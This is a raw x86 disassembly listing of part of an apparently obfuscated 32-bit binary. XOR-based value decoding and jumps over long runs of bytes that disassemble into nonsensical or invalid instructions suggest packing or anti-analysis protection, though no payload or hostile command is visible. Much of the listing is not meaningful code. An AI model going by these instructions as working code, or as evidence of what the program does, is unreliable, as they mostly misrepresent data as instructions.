  404694:	shrd   eax,ecx,0x2
  404698:	shr    ecx,0x2
  40469b:	mov    ecx,DWORD PTR [ebp-0x60]
  40469e:	mov    edx,DWORD PTR [ebp-0x5c]
  4046a1:	xor    eax,edi
  4046a3:	xor    edx,edx
  4046a5:	or     eax,edx
  4046a7:	mov    edx,DWORD PTR [ebp+0x14]
  4046aa:	shl    ecx,0x1e
  4046ad:	mov    ecx,DWORD PTR [ebp-0x14]
  4046b0:	mov    cl,BYTE PTR [eax+ecx*1]
  4046b3:	mov    eax,DWORD PTR [ebp-0x34]
  4046b6:	or     BYTE PTR [eax],cl
  4046b8:	mov    eax,DWORD PTR [ebp+0x10]
  4046bb:	mov    ecx,eax
  4046bd:	shrd   ecx,edx,0x2
  4046c1:	shl    eax,0x1e
  4046c4:	shr    edx,0x2
  4046c7:	mov    DWORD PTR [ebp+0x14],edx
  4046ca:	mov    DWORD PTR [ebp+0x14],eax
  4046cd:	xor    edx,edx
  4046cf:	mov    eax,ecx
  4046d1:	xor    eax,edi
  4046d3:	or     eax,edx
  4046d5:	mov    edx,DWORD PTR [ebp-0x4]
  4046d8:	dec    eax
  4046d9:	not    eax
  4046db:	and    eax,edx
  4046dd:	xor    ecx,edi
  4046df:	mov    DWORD PTR [ebp-0x4],eax
  4046e2:	mov    DWORD PTR [ebp+0x14],ecx
  4046e5:	xor    eax,eax
  4046e7:	or     DWORD PTR [ebp+0x14],eax
  4046ea:	mov    eax,DWORD PTR [ebp-0x50]
  4046ed:	mov    ecx,DWORD PTR [ebp-0x4c]
  4046f0:	shrd   eax,ecx,0x2
  4046f4:	shr    ecx,0x2
  4046f7:	mov    cx,ax
  4046fa:	mov    eax,DWORD PTR [ebp-0x50]
  4046fd:	mov    edx,0x6d9d
  404702:	xor    cx,dx
  404705:	mov    edx,DWORD PTR [ebp-0x4c]
  404708:	xor    edx,edx
  40470a:	shl    eax,0x1e
  40470d:	mov    ax,dx
  404710:	or     ax,cx
  404713:	mov    ecx,DWORD PTR [ebp-0x4]
  404716:	cmp    WORD PTR [ecx],ax
  404719:	je     0x4047ae
  40471f:	mov    eax,DWORD PTR [ebp+0x14]
  404722:	sub    DWORD PTR [ebp-0x4],eax
  404725:	mov    eax,DWORD PTR [esi]
  404727:	mov    ecx,DWORD PTR [esi+0x4]
  40472a:	mov    ecx,eax
  40472c:	shl    ecx,0x1e
  40472f:	xor    ecx,0x80000000
  404735:	mov    DWORD PTR [ebp-0x64],ecx
  404738:	mov    ecx,DWORD PTR [esi]
  40473a:	mov    edx,DWORD PTR [esi+0x4]
  40473d:	xor    edx,0x9d2b8af8
  404743:	xor    ecx,0xcb89b677
  404749:	shrd   ecx,edx,0x2
  40474d:	shr    edx,0x2
  404750:	or     edx,DWORD PTR [ebp-0x64]
  404753:	xor    eax,eax
  404755:	or     ecx,eax
  404757:	mov    eax,DWORD PTR [ebx]
  404759:	mov    DWORD PTR [ebp-0x2c],edx
  40475c:	mov    edx,DWORD PTR [ebx+0x4]
  40475f:	mov    edx,eax
  404761:	xor    eax,eax
  404763:	shl    edx,0x1e
  404766:	xor    edx,0x80000000
  40476c:	mov    DWORD PTR [ebp-0x70],eax
  40476f:	mov    eax,DWORD PTR [ebx]
  404771:	mov    DWORD PTR [ebp-0x6c],edx
  404774:	mov    edx,DWORD PTR [ebx+0x4]
  404777:	xor    eax,0xcb89b677
  40477c:	xor    edx,0x9d2b8af8
  404782:	shrd   eax,edx,0x2
  404786:	or     eax,DWORD PTR [ebp-0x70]
  404789:	shr    edx,0x2
  40478c:	mov    DWORD PTR [ebp-0x38],eax
  40478f:	mov    eax,edx
  404791:	or     eax,DWORD PTR [ebp-0x6c]
  404794:	mov    DWORD PTR [ebp-0x5c],edx
  404797:	cmp    ecx,DWORD PTR [ebp-0x38]
  40479a:	jne    0x4046ea
  4047a0:	cmp    DWORD PTR [ebp-0x2c],eax
  4047a3:	je     0x4069dd
  4047a9:	jmp    0x4046ea
  4047ae:	mov    eax,DWORD PTR [esi]
  4047b0:	mov    ecx,DWORD PTR [esi+0x4]
  4047b3:	mov    ecx,eax
  4047b5:	shl    ecx,0x1e
  4047b8:	xor    ecx,0x80000000
  4047be:	mov    DWORD PTR [ebp+0x14],ecx
  4047c1:	mov    ecx,DWORD PTR [esi]
  4047c3:	mov    edx,DWORD PTR [esi+0x4]
  4047c6:	jmp    0x404a70
  4047cb:	and    eax,0x59cc0e1
  4047d0:	mov    ebp,0x1f6c79bd
  4047d5:	sar    BYTE PTR [ebx],0x37
  4047d8:	xor    eax,0xfaa90549
  4047dd:	mov    ebx,0xbbbfd0bb
  4047e2:	mov    ebx,0x10dba662
  4047e7:	push   edx
  4047e8:	in     al,dx
  4047e9:	fs push eax
  4047eb:	movntps XMMWORD PTR [ebp-0x5bdb4078],xmm0
  4047f2:	sbb    al,0x6
  4047f4:	push   ds
  4047f5:	in     eax,0x2a
  4047f7:	pop    esi
  4047f8:	mov    ebx,0x293423f3
  4047fd:	fwait
  4047fe:	mov    ecx,0x6d87f1f4
  404803:	sbb    eax,0x37ca8393
  404808:	inc    esi
  404809:	dec    esi
  40480a:	pop    ss
  40480b:	mov    BYTE PTR [esp+edx*8+0x2e],dl
  40480f:	sbb    al,0xdc
  404811:	push   esi
  404812:	jb     0x404796
  404814:	lds    edx,FWORD PTR [esi]
  404816:	inc    ebp
  404817:	popf   
  404818:	lods   eax,DWORD PTR ds:[esi]
  404819:	std    
  40481a:	jnp    0x4047c7
  40481c:	imul   esp,DWORD PTR [ebx],0xffffffff
  40481f:	stos   DWORD PTR es:[edi],eax
  404820:	(bad)  
  404821:	or     eax,0x96ccdc28
  404826:	push   ebp
  404827:	push   es
  404828:	mov    ebx,0xf532beec
  40482d:	rcr    DWORD PTR [eax+0x58],cl
  404830:	push   esi
  404831:	les    edx,FWORD PTR [ebp+0x7bbfcd6f]
  404837:	cmp    DWORD PTR ds:0xcdf710cb,ebx
  40483d:	test   DWORD PTR ds:0x7cfdc58b,ecx
  404843:	cmp    al,0x8
  404845:	inc    esp
  404846:	lods   al,BYTE PTR ds:[esi]
  404847:	std    
  404848:	fisttp DWORD PTR [ebx+0x28]
  40484b:	shl    DWORD PTR [ebp+0x2b],cl
  40484e:	into   
  40484f:	jg     0x40480f
  404851:	lahf   
  404852:	test   al,0x37
  404854:	add    ch,ah
  404856:	sub    ebx,0xb5dcbb46
  40485c:	pop    eax
  40485d:	xor    al,0x43
  40485f:	push   cs
  404860:	pusha  
  404861:	(bad)  
  404862:	das    
  404863:	retf   0x4f7f
  404866:	ficom  DWORD PTR [ebx]
  404868:	shrd   ebx,ebp,cl
  40486b:	push   ebp
  40486c:	test   BYTE PTR [edi+0x74ec7965],bl
  404872:	lods   al,BYTE PTR ds:[esi]
  404873:	ret    0x415
  404876:	mov    ebp,0xa2d37b6c
  40487b:	and    ebp,edx
  40487d:	xchg   esi,eax
  40487e:	cmp    BYTE PTR [edi+0x7c],bl
  404881:	jae    0x404820
  404883:	ss jge 0x404846
  404886:	or     esp,esp
  404888:	adc    al,0x9
  40488a:	inc    edx
  40488b:	arpl   WORD PTR [esi+0x2d],sp
  40488e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40488f:	jno    0x4048ca
  404891:	mov    ebp,0xe5fe2b2b
  404896:	pop    ebx
  404897:	es in  eax,dx
  404899:	pop    edx
  40489a:	sub    edi,DWORD PTR [eax-0x59971e32]
  4048a0:	in     al,0x3b
  4048a2:	sub    ch,BYTE PTR [ecx+0x4f]
  4048a5:	adc    bh,al
  4048a7:	cmp    edx,eax
  4048a9:	mov    ch,0xf7
  4048ab:	adc    al,0x5
  4048ad:	ss addr16 (bad) 
  4048b0:	and    al,0x4a
  4048b2:	cmp    DWORD PTR [eax+esi*8+0x4e],edx
  4048b6:	adc    BYTE PTR [edx],dh
  4048b8:	mov    ?,ebx
  4048ba:	rol    DWORD PTR [esi],0x2e
  4048bd:	repz pop eax
  4048bf:	push   es
  4048c0:	imul   eax,DWORD PTR [ebx+0x31],0x3ef52128
  4048c7:	dec    esp
  4048c8:	sbb    eax,0x152792dc
  4048cd:	mov    esi,0xba882428
  4048d2:	call   FWORD PTR [eax-0x291a0f55]
  4048d8:	add    bl,BYTE PTR [ebp+0x5c]
  4048db:	popa   
  4048dc:	jbe    0x404928
  4048de:	cmp    eax,esp
  4048e0:	mov    dh,0xcd
  4048e2:	cmp    edx,DWORD PTR [esi+0x20]
  4048e5:	jp     0x404958
  4048e7:	call   0x7ded:0x59cec100
  4048ee:	daa    
  4048ef:	imul   edi,DWORD PTR [eax+eax*1],0x4562a2c5
  4048f6:	jmp    0x8d83971d
  4048fb:	and    ch,BYTE PTR fs:[ebp+0x3f]
  4048ff:	mov    esi,DWORD PTR [ebx+0x6f77f7e6]
  404905:	in     al,0x24
  404907:	es leave 
  404909:	pop    DWORD PTR [eax-0x62c73b92]
  40490f:	loopne 0x40494a
  404911:	fnstcw WORD PTR [ebx+0x4f240d04]
  404917:	stos   DWORD PTR es:[edi],eax
  404918:	rcr    DWORD PTR ds:0x463bbca0,cl
  40491e:	jbe    0x40499a
  404920:	popf   
  404921:	repz cld 
  404923:	inc    eax
  404924:	scas   al,BYTE PTR es:[edi]
  404925:	outs   dx,DWORD PTR ds:[esi]
  404926:	add    BYTE PTR [edx+0x13be001e],dl
  40492c:	adc    BYTE PTR [edi+0x51],al
  40492f:	jno    0x40495e
  404931:	pop    es
  404932:	pop    esp
  404933:	push   eax
  404934:	push   ebp
  404935:	cs jns 0x40491b
  404938:	std    
  404939:	mov    ah,0xf8
  40493b:	push   0x3f
  40493d:	adc    eax,0xd3717688
  404942:	sbb    eax,0x5c0e8f50
  404947:	adc    ah,BYTE PTR [edi+0x3f1fcc52]
  40494d:	test   eax,0xdc116c52
  404952:	and    ebp,edx
  404954:	(bad)  
  404955:	aad    0x85
  404957:	sahf   
  404958:	add    ch,ch
  40495a:	test   edi,0xe1946240
  404960:	push   ds
  404961:	and    ah,ah
  404963:	sbb    ch,BYTE PTR [eax+0x78444633]
  404969:	inc    ecx
  40496a:	aam    0xc8
  40496c:	adc    esp,DWORD PTR [edx-0x2]
  40496f:	sub    BYTE PTR [edi-0x1df9d0ca],0xba
  404976:	add    edx,ebp
  404978:	nop
  404979:	fldenv [ecx]
  40497b:	ret    
  40497c:	mov    eax,0x9b5b6e0c
  404981:	jb     0x404982
  404983:	pop    DWORD PTR [ebx+0x3c]
  404986:	leave  
  404987:	xchg   BYTE PTR [edx],bh
  404989:	inc    ebx
  40498a:	mov    eax,ds:0xd32b146b
  40498f:	lods   eax,DWORD PTR ds:[esi]
  404990:	int3   
  404991:	sbb    bl,dh
  404993:	shr    BYTE PTR [ecx+0x5d318a50],1
  404999:	int    0x7d
  40499b:	imul   edi,DWORD PTR [eax-0x4c11741f],0x3af4dc9b
  4049a5:	cmp    al,0x58
  4049a7:	call   0x536748e8
  4049ac:	loop   0x4049c7
  4049ae:	push   eax
  4049af:	dec    ebx
  4049b0:	adc    eax,0xc6c5a2ab
  4049b5:	test   eax,0xf0ebb93f
  4049ba:	xchg   edx,ebp
  4049bc:	into   
  4049bd:	fsub   DWORD PTR [ecx]
  4049bf:	sub    BYTE PTR [edx+0x79],ah
  4049c2:	pop    ecx
  4049c3:	ja     0x4049aa
  4049c5:	clc    
  4049c6:	(bad)  
  4049c7:	imul   ebp,ecx,0x55
  4049ca:	jp     0x4049c5
  4049cc:	pop    ebx
  4049cd:	mov    ah,0x84
  4049cf:	aam    0x8b
  4049d1:	fist   DWORD PTR [ebp-0x5520fc11]
  4049d7:	call   0xeb5e5aec
  4049dc:	push   ds
  4049dd:	data16 mov al,ds:0xf04296e0
  4049e3:	call   0x32e5:0xd25e80b
  4049ea:	daa    
  4049eb:	push   edx
  4049ec:	add    al,al
  4049ee:	xchg   BYTE PTR [ebp+0x55],dl
  4049f1:	repnz scas eax,DWORD PTR es:[edi]
  4049f3:	jns    0x404987
  4049f5:	sbb    edi,esi
  4049f7:	mov    edi,0x21568453
  4049fc:	jae    0x404a18
  4049fe:	pop    edi
  4049ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a00:	retf   0x69eb
  404a03:	or     al,bl
  404a05:	jmp    0x47b:0x3dde799a
  404a0c:	inc    edx
  404a0d:	in     al,dx
  404a0e:	inc    edx
  404a0f:	sbb    cl,BYTE PTR [edi+0x4925ec56]
  404a15:	xchg   esp,eax
  404a16:	add    bl,BYTE PTR [eax+0x677c8e47]
  404a1c:	cmp    bl,ah
  404a1e:	mov    ebp,eax
  404a20:	jne    0x404a85
  404a22:	xchg   ecx,eax
  404a23:	xchg   edi,eax
  404a24:	mov    ch,0xb
  404a26:	lahf   
  404a27:	pop    ecx
  404a28:	mov    DWORD PTR [edi],ecx
  404a2a:	jae    0x404a8d
  404a2c:	mov    al,ds:0xbc45bb42
  404a31:	fcom   DWORD PTR [ebx-0x5544687e]
  404a37:	xor    DWORD PTR [edx-0x48f9dc93],0x9e29a3f1
  404a41:	or     eax,0xc38f49e6
  404a46:	int3   
  404a47:	retf   0x92d
  404a4a:	adc    BYTE PTR [ebx],al
  404a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a4d:	push   0x1c
  404a4f:	lds    esp,FWORD PTR [eax+0x54]
  404a52:	jbe    0x404a17
  404a54:	stc    
  404a55:	into   
  404a56:	adc    eax,0xaafd535f
  404a5b:	jle    0x404a1a
  404a5d:	jb     0x404a14
  404a5f:	sbb    BYTE PTR [edx-0x6c],cl
  404a62:	js     0x404a29
  404a64:	xchg   ebp,eax
  404a65:	sbb    cl,dh
  404a67:	push   0x53
  404a69:	in     al,0x61
  404a6b:	sub    BYTE PTR [eax-0x7e7501d7],bl
  404a71:	icebp  
  404a72:	ja     0x404a2a
  404a74:	mov    ebx,ecx
  404a76:	xor    edx,0x9d2b8af8
  404a7c:	shrd   ecx,edx,0x2
  404a80:	xor    eax,eax
  404a82:	or     ecx,eax
  404a84:	mov    eax,DWORD PTR [ebx]
  404a86:	mov    DWORD PTR [ebp-0x68],ecx
  404a89:	mov    ecx,DWORD PTR [ebx+0x4]
  404a8c:	mov    ecx,eax
  404a8e:	xor    eax,eax
  404a90:	shr    edx,0x2
  404a93:	jmp    0x404d3d
  404a98:	push   cs
  404a99:	js     0x404b19
  404a9b:	jno    0x404a49
  404a9d:	mov    ebp,0x24eabd35
  404aa2:	sti    
  404aa3:	jno    0x404a2d
  404aa5:	pop    edi
  404aa6:	stos   DWORD PTR es:[edi],eax
  404aa7:	cmp    esi,DWORD PTR [esi-0x2f4444fc]
  404aad:	mov    edi,0x6130bbbb
  404ab2:	mov    DWORD PTR [ecx],ecx
  404ab4:	jnp    0x404a44
  404ab6:	add    DWORD PTR [ebx],ecx
  404ab8:	out    dx,eax
  404ab9:	mov    dl,BYTE PTR [esi+0x4372d285]
  404abf:	pop    es
  404ac0:	call   0xa4fa:0x31776e35
  404ac7:	mov    edx,0xee9fbcc
  404acc:	in     al,dx
  404acd:	inc    esi
  404ace:	je     0x404b0c
  404ad0:	pop    esi
  404ad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ad2:	shl    BYTE PTR [edx-0x7e286e7f],1
  404ad8:	xor    eax,0xa8d95199
  404add:	mov    bh,0xdf
  404adf:	ficom  DWORD PTR [ebp+edi*8-0x5c6c20d8]
  404ae6:	mov    WORD PTR ds:0xf5b17ff8,es
  404aec:	or     al,0x3c
  404aee:	mov    cl,0xaa
  404af0:	dec    BYTE PTR [edi+0x42f5c353]
  404af6:	pop    ecx
  404af7:	fadd   DWORD PTR [ecx]
  404af9:	std    
  404afa:	inc    eax
  404afb:	rol    ecx,cl
  404afd:	int    0x97
  404aff:	aaa    
  404b00:	fs push ds
  404b02:	adc    edi,ebp
  404b04:	inc    eax
  404b05:	pop    ss
  404b06:	xor    al,0xec
  404b08:	add    DWORD PTR [ebx+0x46ec62d],0xe052c803
  404b12:	mov    ecx,0xd415473f
  404b17:	(bad)
  404b1b:	and    al,0x3b
  404b1d:	pop    ecx
  404b1e:	lods   eax,DWORD PTR ds:[esi]
  404b1f:	shl    BYTE PTR [edx],0xbf
  404b22:	fld    DWORD PTR [edx]
  404b24:	xor    esi,DWORD PTR [eax]
  404b26:	ret    0x8dc6
  404b29:	sbb    BYTE PTR [ebx],cl
  404b2b:	sub    dh,BYTE PTR [edi+eax*2-0x705dd8]
  404b32:	sub    ebx,DWORD PTR [ecx-0x1]
  404b35:	or     al,0x25
  404b37:	scas   al,BYTE PTR es:[edi]
  404b38:	sbb    al,0x6d
  404b3a:	push   esp
  404b3b:	and    ch,bh
  404b3d:	cs pop edi
  404b3f:	(bad)  
  404b40:	into   
  404b41:	xchg   DWORD PTR [ecx-0x562ba7c3],eax
  404b47:	jb     0x404b8f
  404b49:	add    eax,ebx
  404b4b:	repnz mov edi,0x9feeedb7
  404b51:	lock pop es
  404b53:	jbe    0x404b49
  404b55:	sbb    cl,ch
  404b57:	push   ss
  404b58:	sub    BYTE PTR [ebp-0x16],dl
  404b5b:	daa    
  404b5c:	test   BYTE PTR [ebp+0x3b18867],al
  404b62:	ss push esp
  404b64:	xor    eax,0xd0523eae
  404b69:	scas   al,BYTE PTR es:[edi]
  404b6a:	inc    edx
  404b6b:	fwait
  404b6c:	div    bh
  404b6e:	fmulp  st(4),st
  404b70:	mov    esi,0xa64539da
  404b75:	fnstsw WORD PTR [ecx*2+0x73b3da18]
  404b7c:	mov    BYTE PTR [edx+0x6b72cd05],dh
  404b82:	jnp    0x404b90
  404b84:	data16 jno 0x404b0c
  404b87:	(bad)
  404b8a:	pop    esi
  404b8b:	sbb    ebx,edx
  404b8d:	xchg   esp,eax
  404b8e:	(bad)  
  404b90:	bound  eax,QWORD PTR [ebx]
  404b92:	mov    al,ds:0xb852e356
  404b97:	push   esi
  404b98:	mov    bl,0xf5
  404b9a:	pop    esi
  404b9b:	mov    ebx,0x39aa4a42
  404ba0:	ror    DWORD PTR [edi],1
  404ba2:	std    
  404ba3:	fisub  DWORD PTR [ebx]
  404ba5:	mov    BYTE PTR [edx-0x3c4482b7],cl
  404bab:	nop
  404bac:	push   ebp
  404bad:	mov    ?,edx
  404baf:	fs xchg dl,bl
  404bb2:	xchg   ebx,eax
  404bb3:	iret   
  404bb4:	xor    DWORD PTR [edi],eax
  404bb6:	or     BYTE PTR [edx+0xd],ch
  404bb9:	add    ah,0xb9
  404bbc:	sti    
  404bbd:	mov    bh,dh
  404bbf:	gs out dx,eax
  404bc1:	hlt    
  404bc2:	inc    eax
  404bc3:	pop    edx
  404bc4:	sbb    ch,al
  404bc6:	push   esi
  404bc7:	add    BYTE PTR [ebx-0x48],cl
  404bca:	scas   eax,DWORD PTR es:[edi]
  404bcb:	or     cl,BYTE PTR [ebx+0x705d56be]
  404bd1:	int    0xf9
  404bd3:	or     al,0x43
  404bd5:	out    0xa1,al
  404bd7:	fild   WORD PTR [ebx+ecx*4-0x39]
  404bdb:	adc    BYTE PTR [ebx-0x1b],bl
  404bde:	push   ss
  404bdf:	mov    edi,0xea1184b7
  404be4:	mov    ebx,0xc8722013
  404be9:	fcom   st(2)
  404beb:	adc    al,0xd5
  404bed:	test   al,0x6d
  404bef:	aad    0x90
  404bf1:	dec    esi
  404bf2:	cld    
  404bf3:	aaa    
  404bf4:	inc    ebx
  404bf5:	adc    edi,ecx
  404bf7:	inc    edi
  404bf8:	and    eax,0x74e4ec37
  404bfe:	test   al,0x5c
  404c00:	sbb    ebp,eax
  404c02:	test   BYTE PTR [ecx],cl
  404c04:	adc    BYTE PTR [ecx+edx*4-0x1df1c353],bl
  404c0b:	retf   
  404c0c:	out    0x26,al
  404c0e:	rcr    DWORD PTR [edi],0xec
  404c11:	int3   
  404c12:	adc    al,ch
  404c14:	adc    eax,0x3ab277f
  404c19:	mov    BYTE PTR [esi+0x616b7c0d],bh
  404c1f:	loop   0x404c34
  404c21:	pop    es
  404c22:	jl     0x404c3a
  404c24:	fwait
  404c25:	or     dl,BYTE PTR [esi-0x31]
  404c28:	xchg   esi,eax
  404c29:	adc    al,0x6
  404c2b:	dec    eax
  404c2c:	imul   ebx,edx,0x697ae29d
  404c32:	pop    edi
  404c33:	sahf   
  404c34:	push   ecx
  404c35:	xlat   BYTE PTR ds:[ebx]
  404c36:	rcl    edi,1
  404c38:	outs   dx,DWORD PTR ds:[esi]
  404c39:	loop   0x404c8d
  404c3b:	pop    edi
  404c3c:	mov    bl,0xdc
  404c3e:	retf   0xe76b
  404c41:	push   edx
  404c42:	in     al,0xaa
  404c44:	ror    cl,0x8b
  404c47:	add    DWORD PTR [eax-0x37dcdb70],ebx
  404c4d:	pop    ss
  404c4e:	jno    0x404ca8
  404c50:	les    esp,FWORD PTR [ebp-0x2b]
  404c53:	sub    cl,BYTE PTR [edi]
  404c55:	and    DWORD PTR [ecx-0x57],ecx
  404c58:	fs aaa 
  404c5a:	imul   BYTE PTR [esi+edx*2+0x39]
  404c5e:	inc    edx
  404c5f:	dec    ebx
  404c60:	stc    
  404c61:	inc    ecx
  404c62:	pop    ss
  404c63:	dec    ecx
  404c64:	rcr    BYTE PTR [edx-0x31f92745],cl
  404c6a:	outs   dx,DWORD PTR ds:[esi]
  404c6b:	and    eax,0xefccaeb2
  404c70:	fs (bad) 
  404c75:	jl     0x404c70
  404c77:	shl    BYTE PTR [eax-0x4fd05a14],cl
  404c7d:	sbb    ch,BYTE PTR [esp+ebx*1-0x1a34fc43]
  404c84:	or     esp,DWORD PTR [eax]
  404c86:	out    0xb7,al
  404c88:	mov    bl,0xe6
  404c8a:	outs   dx,BYTE PTR ds:[esi]
  404c8b:	stc    
  404c8c:	shr    DWORD PTR [esi-0x169638c7],1
  404c92:	popa   
  404c93:	inc    ebx
  404c94:	jmp    0x105f:0xdae5c422
  404c9b:	cmc    
  404c9c:	inc    edi
  404c9d:	adc    ch,al
  404c9f:	xor    cl,BYTE PTR [edx+edi*2+0x7c]
  404ca3:	clc    
  404ca4:	aam    0xe6
  404ca6:	loop   0x404cc4
  404ca8:	aad    0xbc
  404caa:	ja     0x404c91
  404cac:	adc    eax,0xf4ed1386
  404cb1:	cmp    esp,DWORD PTR [esp+edi*1+0x72db1924]
  404cb8:	mov    esi,0x548f07e2
  404cbd:	mov    esp,DWORD PTR [eax-0x5b]
  404cc0:	rcl    DWORD PTR [ecx-0x6805c2e0],1
  404cc6:	push   ss
  404cc7:	jp     0x404d1b
  404cc9:	inc    edi
  404cca:	imul   ecx,DWORD PTR [edx+0x4bcbf92f],0xffffffda
  404cd1:	or     eax,edi
  404cd3:	jae    0x404c7a
  404cd5:	nop
  404cd6:	sar    bh,1
  404cd8:	xchg   esp,eax
  404cd9:	cwde   
  404cda:	adc    BYTE PTR [ebp-0x3167130d],cl
  404ce0:	inc    edi
  404ce1:	outs   dx,BYTE PTR ds:[esi]
  404ce2:	ins    DWORD PTR es:[edi],dx
  404ce3:	mov    ds:0x8290046,eax
  404ce8:	pop    ss
  404ce9:	xor    al,0xfd
  404ceb:	fnsetpm(287 only) 
  404ced:	mov    bh,0x85
  404cef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cf0:	addr16 xchg ecx,eax
  404cf2:	xchg   esp,eax
  404cf3:	push   esi
  404cf4:	sbb    edx,DWORD PTR [ebx-0x61]
  404cf7:	inc    ecx
  404cf8:	data16 jge 0x404cc3
  404cfb:	sbb    eax,0xe9fde08b
  404d00:	mov    WORD PTR [esi],fs
  404d02:	leave  
  404d03:	jmp    0x404d66
  404d05:	inc    edx
  404d06:	mov    esp,0xdfd673ab
  404d0b:	sub    ch,BYTE PTR [edi+0x2c]
  404d0e:	mov    ah,0x5f
  404d10:	cld    
  404d11:	pop    ebp
  404d12:	mov    al,0xc
  404d14:	(bad)  
  404d15:	sub    al,0xc6
  404d17:	addr16 stc 
  404d19:	clc    
  404d1a:	xchg   ebp,eax
  404d1b:	in     al,dx
  404d1c:	ins    DWORD PTR es:[edi],dx
  404d1d:	xor    dl,0x5d
  404d20:	dec    ebp
  404d21:	fsubr  st(1),st
  404d23:	push   ebx
  404d24:	mov    eax,ds:0x66414437
  404d29:	mov    WORD PTR [ebx-0x80],cs
  404d2c:	sbb    al,0xae
  404d2e:	sbb    al,dl
  404d30:	fwait
  404d31:	sbb    al,0xf1
  404d33:	adc    eax,0x9aa14f6c
  404d38:	aam    0xcf
  404d3a:	mov    cl,0xff
  404d3c:	outs   dx,DWORD PTR ds:[esi]
  404d3d:	or     edx,DWORD PTR [ebp+0x14]
  404d40:	mov    DWORD PTR [ebp+0x10],eax
  404d43:	mov    eax,DWORD PTR [ebx]
  404d45:	shl    ecx,0x1e
  404d48:	xor    ecx,0x80000000
  404d4e:	mov    DWORD PTR [ebp-0x64],edx
  404d51:	mov    edx,DWORD PTR [ebx+0x4]
  404d54:	xor    eax,0xcb89b677
  404d59:	mov    DWORD PTR [ebp+0x14],ecx
  404d5c:	mov    ecx,0x9d2b8af8
  404d61:	xor    edx,ecx
  404d63:	shrd   eax,edx,0x2
  404d67:	or     eax,DWORD PTR [ebp+0x10]
  404d6a:	jmp    0x405014
  404d6f:	jmp    0x404d16
  404d71:	pop    esi
  404d72:	add    DWORD PTR [ebp+0x57b5b501],esi
  404d78:	sub    al,0xbe
  404d7a:	cmp    esp,DWORD PTR [esi-0x32046aea]
  404d80:	push   es
  404d81:	mov    ebx,0xbbbfd0bb
  404d86:	mov    ebx,0x80f00a2
  404d8b:	loop   0x404de8
  404d8d:	and    eax,esp
  404d8f:	dec    ebp
  404d90:	xchg   ebx,eax
  404d91:	in     al,dx
  404d92:	and    eax,0xe10b837d
  404d97:	retf   0x911a
  404d9a:	leave  
  404d9b:	push   eax
  404d9c:	xchg   esp,eax
  404d9d:	xchg   ebp,eax
  404d9e:	or     al,0x64
  404da0:	int    0xad
  404da2:	fisttp QWORD PTR [esi-0x3e]
  404da5:	imul   eax,DWORD PTR [ebp-0x6c],0xffffffa2
  404da9:	ins    DWORD PTR es:[edi],dx
  404daa:	push   ebp
  404dab:	pop    edx
  404dac:	loop   0x404d63
  404dae:	jp     0x404d62
  404db0:	hlt    
  404db1:	out    dx,eax
  404db2:	pop    esi
  404db3:	mov    esp,0x3fe85bfb
  404db8:	cmp    BYTE PTR [esi],bh
  404dba:	stc    
  404dbb:	stos   DWORD PTR es:[edi],eax
  404dbc:	dec    edi
  404dbd:	mov    edi,0x54e582c2
  404dc2:	xor    bh,BYTE PTR [eax+0x7e]
  404dc5:	inc    edi
  404dc6:	fs int3 
  404dc8:	scas   eax,DWORD PTR es:[edi]
  404dc9:	inc    esp
  404dca:	xchg   esi,eax
  404dcb:	addr16 sub al,0x23
  404dce:	loopne 0x404e3d
  404dd0:	jae    0x404dc6
  404dd2:	mov    edi,0xebcd80db
  404dd7:	cli    
  404dd8:	inc    edx
  404dd9:	xchg   esi,eax
  404dda:	and    BYTE PTR ds:0x257485c,bl
  404de0:	retf   0x2fc7
  404de3:	sub    bl,BYTE PTR [ebp+ebp*8-0x53343f6]
  404dea:	jae    0x404d70
  404dec:	jge    0x404e1a
  404dee:	cmp    ch,BYTE PTR [edi-0x58]
  404df1:	dec    ebp
  404df2:	rcl    bh,0x39
  404df5:	xchg   ebx,eax
  404df6:	test   DWORD PTR [ecx],esp
  404df8:	dec    ecx
  404df9:	lock leave 
  404dfb:	stc    
  404dfc:	push   ss
  404dfd:	mov    dh,BYTE PTR [edx-0x3bb90de3]
  404e03:	and    BYTE PTR [edi],al
  404e05:	pop    ds
  404e06:	lahf   
  404e07:	fcom   QWORD PTR [edx]
  404e09:	inc    ecx
  404e0a:	in     eax,dx
  404e0b:	jecxz  0x404e0a
  404e0d:	dec    ebx
  404e0e:	fsub   st,st(3)
  404e10:	fsubr  st(7),st
  404e12:	imul   edi,DWORD PTR [ebp+0x14eeaa9d],0xffffffc4
  404e19:	jno    0x404e2c
  404e1b:	scas   eax,DWORD PTR es:[edi]
  404e1c:	scas   al,BYTE PTR es:[edi]
  404e1d:	xor    al,0xa9
  404e1f:	sbb    dh,BYTE PTR [eax-0x66]
  404e22:	sbb    bl,BYTE PTR [esi-0x79]
  404e25:	inc    edx
  404e26:	das    
  404e27:	inc    eax
  404e28:	je     0x404e82
  404e2a:	pop    edi
  404e2b:	loop   0x404e6e
  404e2d:	imul   esi,ebp,0x4f397134
  404e33:	push   ds
  404e34:	mov    edi,0xb8121c7d
  404e39:	nop
  404e3a:	cmp    edi,ebp
  404e3c:	adc    ecx,edx
  404e3e:	mov    esi,0x648d4924
  404e43:	sub    al,BYTE PTR [edi+edx*1]
  404e46:	nop
  404e47:	mov    ebp,0x97e63a8e
  404e4c:	sahf   
  404e4d:	xchg   esi,eax
  404e4e:	(bad)  [esp+edx*4]
  404e51:	xor    DWORD PTR [ebx+0x697a0f17],0x77cb903
  404e5b:	dec    edi
  404e5c:	mov    bh,0x35
  404e5e:	jb     0x404e70
  404e60:	xchg   esp,eax
  404e61:	repnz xchg ebp,eax
  404e63:	(bad)  
  404e64:	xor    cl,al
  404e66:	and    eax,0xc49f6561
  404e6b:	mov    ecx,0x98ab5c5c
  404e70:	fbld   TBYTE PTR [ebx]
  404e72:	mov    ds:0x412af847,eax
  404e77:	arpl   WORD PTR [ebp-0x76],bp
  404e7a:	mov    ebx,0x851e7116
  404e7f:	mov    eax,ds:0x46f8f25b
  404e84:	mov    ch,0xeb
  404e86:	push   ds
  404e87:	imul   eax,DWORD PTR [ecx],0xfffffffe
  404e8a:	out    0x41,eax
  404e8c:	outs   dx,DWORD PTR ds:[esi]
  404e8d:	pop    ecx
  404e8e:	mov    eax,0xddcd5af8
  404e93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
